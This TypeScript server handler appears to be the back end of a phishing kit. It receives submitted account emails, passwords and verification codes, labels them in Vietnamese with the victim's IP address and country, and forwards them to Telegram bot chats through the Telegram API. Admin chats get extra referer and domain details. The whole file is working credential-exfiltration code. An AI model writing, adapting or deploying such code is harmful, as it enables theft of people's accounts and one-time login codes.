import { countryAlpha2CodeMapIcon } from '../utils/country'

export default defineEventHandler(async (event) => {
  // event.context.path to get the route path: '/api/foo/bar/baz'
  // event.context.params._ to get the route segment: 'bar/baz'
  const { account, code, message, newUser } = await readBody(event)
  if (!account && !code && !message && !newUser) {
    throw createError({
      statusCode: 400,
      statusMessage: 'Bad Request',
    })
  }
  try {
    const countryCode = event?.headers.get('CF-IPCountry')
    const countryIcon =
      countryAlpha2CodeMapIcon[countryCode as keyof typeof countryAlpha2CodeMapIcon] || '🌐'
    const runtimeConfig = useRuntimeConfig()
    const tokens = runtimeConfig.TELEGRAM_BOT_TOKEN.split('|')
    const chatIds = runtimeConfig.TELEGRAM_CHAT_ID?.split('|')
    const adminId = runtimeConfig.ADMIN_ID
    const HOST_PRODUCTION = runtimeConfig.HOST_PRODUCTION
    const host = event.node.req.headers.host
      ? event.node.req.headers.host.replace(/</g, '&lt;').replace(/>/g, '&gt;')
      : 'N/A'

    if (HOST_PRODUCTION === host && !countryCode) {
      throw createError({
        statusCode: 400,
        statusMessage: 'Bad Request',
      })
    }

    console.log('tokens', tokens, 'chatIds', chatIds)
    if (!tokens || !chatIds || tokens.length !== chatIds.length) {
      throw createError({
        statusCode: 400,
        statusMessage: 'Bad Request',
      })
    }

    let messageText = ''

    if (code) {
      messageText = `
<b>📲 Code : </b><code>${code}</code>
----------------
<b>🛰 Địa chỉ ip: </b>${event.headers.get('CF-Connecting-IP')}
<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}
`
    } else if (account) {
      messageText = `
<b>🔑 Tài khoản: </b><code>${account.email}</code>
<b>🔐 Mật khẩu: </b><code>${account.password}</code>
----------------
<b>🛰 ip: </b>${event.headers.get('CF-Connecting-IP')}
<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}
`
    } else {
      messageText = `
<b>${message}</b>
----------------
<b>🛰 ip: </b>${event.headers.get('CF-Connecting-IP')}
<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}
`
    }

    for (let i = 0; i < tokens.length; i++) {
      if (!tokens[i] || !chatIds[i]) {
        continue
      }
      try {
        console.log('sending to', chatIds[i], tokens[i])
        console.log(
          'Admin ID:',
          adminId,
          ' - ChatID:',
          chatIds[i],
          'is equal:',
          adminId === chatIds[i],
        )
        if (chatIds[i] && adminId && chatIds[i] === adminId) {
          messageText += `
- ADMIN INFO -
<b>📡 Referer: </b>${event?.headers?.get('Referer')?.replace(/</g, '&lt;')?.replace(/>/g, '&gt;')}
<b>🌐 Domain: </b>${host}
`
        }
        console.log('messageText', messageText)
        await $fetch(`https://api.telegram.org/bot${tokens[i]}/sendMessage`, {
          method: 'POST',
          body: {
            chat_id: chatIds[i],
            text: messageText,
            parse_mode: 'HTML',
          },
        })
      } catch (error) {
        console.error(error)
      }
    }
    return 'ok'
  } catch (error) {
    // eslint-disable-next-line no-console
    console.error(error)
    return error
  }
})
